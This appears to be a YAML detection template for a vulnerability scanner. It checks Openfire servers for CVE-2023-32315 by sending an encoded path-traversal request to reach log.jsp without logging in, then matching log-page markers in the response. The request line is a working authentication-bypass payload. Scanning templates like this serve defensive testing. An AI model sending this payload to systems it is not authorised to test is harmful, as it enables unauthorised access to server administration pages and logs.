name: yaml-poc-igniterealtime-openfire-directory_traversal-CVE-2023-32315
binding: e90d7f6f-c386-460a-b327-1b16685571bb
manual: false
detail:
    author: jiahao.sun
    links:
        - http://packetstormsecurity.com/files/173607/Openfire-Authentication-Bypass-Remote-Code-Execution.html
        - https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm
    vulnerability:
        id: 430a4e57-eb6b-4e7e-959d-83ca69925d4f
        level: high
    warning: Harmless
transport: tcp
rules:
    r0:
        request:
            cache: true
            content: "GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp HTTP/1.1\r\nHost: \r\n\r\n"
            read_timeout: "3"
        expression: |
            response.raw.bstartsWith(b"HTTP/1.1 200") && ("<title>openfire.log</title>".bmatches(response.raw) || "<th class=\"head-num\">line</th>".bmatches(response.raw) && ("openfire".bmatches(response.raw) || "jivesoftware".bmatches(response.raw)))
expression: r0()
